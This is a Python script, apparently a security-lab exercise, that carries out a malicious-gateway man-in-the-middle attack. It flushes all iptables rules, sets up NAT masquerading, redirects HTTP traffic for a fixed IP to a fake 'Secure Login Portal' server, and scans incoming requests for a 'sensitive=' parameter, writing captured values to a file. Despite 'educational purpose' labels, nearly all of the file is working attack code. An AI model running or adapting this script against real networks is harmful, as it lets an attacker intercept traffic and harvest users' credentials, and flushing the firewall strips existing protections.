#!/usr/local/bin/python3

import os, sys, subprocess

def run(filepath):
    """Implement malicious gateway attack with traffic redirection"""
    
    # Flush iptables and set up malicious redirection
    print("[*] Configuring malicious gateway - iptables manipulation")
    subprocess.call('iptables -F'.split(' '))
    subprocess.call('iptables -F -t nat'.split(' '))
    subprocess.call('iptables -F -t mangle'.split(' '))

    # Configure NAT for traffic forwarding (masquerading as legitimate gateway)
    print("[*] Setting up NAT configuration for traffic control")
    subprocess.call('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'.split(' '))
    subprocess.call('iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT'.split(' '))
    subprocess.call('iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT'.split(' '))

    # Set up the redirection to the fake server (MITM positioning)
    print("[*] Implementing traffic redirection to malicious service")
    subprocess.call('iptables -t nat -A PREROUTING -p tcp -i eth1 -d 142.1.166.97 --dport 80 -j DNAT --to-destination 10.0.0.3:8080'.split(' '))

    # Create the fake response for service impersonation
    print("[*] Deploying fake HTTP service for credential harvesting")
    p = subprocess.Popen('echo -n "Welcome to DarkLab - Secure Login Portal" > /root/index.html', shell=True)
    p.wait()

    # Start the fake HTTP server and log all incoming requests
    print("[*] Starting malicious HTTP server for traffic interception")
    proc = subprocess.Popen(['python2.7', '-m', 'SimpleHTTPServer', '8080'], 
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=r'/root')

    # Log all requests and search for sensitive data patterns
    print("[*] Monitoring intercepted traffic for sensitive data...")
    for line in iter(proc.stdout.readline, b''):
        decoded_line = line.decode('utf-8')
        print(f"[LOG] {decoded_line.strip()}")

        # Check if the request contains sensitive data patterns
        if "GET" in decoded_line and "sensitive=" in decoded_line:
            try:
                # Extract sensitive data (educational demonstration)
                sensitive_data = decoded_line.split("sensitive=")[1].split(' ')[0]
                
                print(f"[!] Captured sensitive data: {sensitive_data}")
                
                # Write the captured data to file for analysis
                with open(filepath, "w") as f:
                    f.write(f"MITM Attack Successful - Captured: {sensitive_data}\n")
                    f.write(f"Attack demonstrates network vulnerability to gateway positioning\n")
                    f.write(f"Educational Purpose: Network security assessment and awareness\n")

                print("[*] Attack successful - Data captured for security analysis")
                # Terminate the server and exit
                proc.terminate()
                sys.exit(0)
            except Exception as e:
                print(f"[ERROR] Error while processing intercepted data: {e}")

# =============================================
# ===== Network Attack Implementation ========
# =============================================
    
if __name__ == "__main__":
    import os, sys, getopt
    def usage():
       print ('Usage:\t' + os.path.basename(__file__) + ' filepath ')
       print ('\nDescription: Malicious gateway attack for network security assessment')
       print ('Educational Purpose: Demonstrate MITM vulnerabilities and defense requirements')
       sys.exit(2)
    # extract parameters
    try:
         opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
    except getopt.GetoptError as err:
         print(err)
         usage()
         sys.exit(2)
    filepath = args[0] if len(args) > 0 else None
    for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
    if (filepath is None):
        print('filepath is missing\n')
        usage()
    
    print("[*] Starting malicious gateway attack demonstration")
    print("[*] Educational Purpose: Network security vulnerability assessment")
    # run the attack
    run(filepath)